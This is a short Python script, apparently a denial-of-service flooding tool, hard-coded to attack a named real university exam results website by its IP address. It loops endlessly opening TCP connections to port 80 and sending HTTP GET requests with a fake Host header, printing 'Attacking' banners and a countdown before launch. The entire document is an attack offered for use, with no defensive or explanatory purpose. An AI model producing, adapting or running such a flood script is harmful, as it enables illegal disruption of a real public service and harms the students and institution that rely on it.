import socket
import time
target = '172.67.206.2'
url = "https://onlineresult.manipuruniv.ac.in/"
fake_ip = '182.21.20.32'
port = 80
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        print(" \033[1;32;40m  Attacking \033[1;31;40m %s \033[1;32;40m  through port \033[1;31;40m %d \033[1;32;40m  " % (url,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
print("\033[1;31;40m TARGET  :  https://onlineresult.manipuruniv.ac.in/index2sem2023.php \n")
print("\033[1;33;40m Starting attack in 6 sec Press \033[1;36;40m CTRL + C \033[1;32;40m to quit")
time.sleep(6)
print("\033[0;37;40m clear ")
attack()
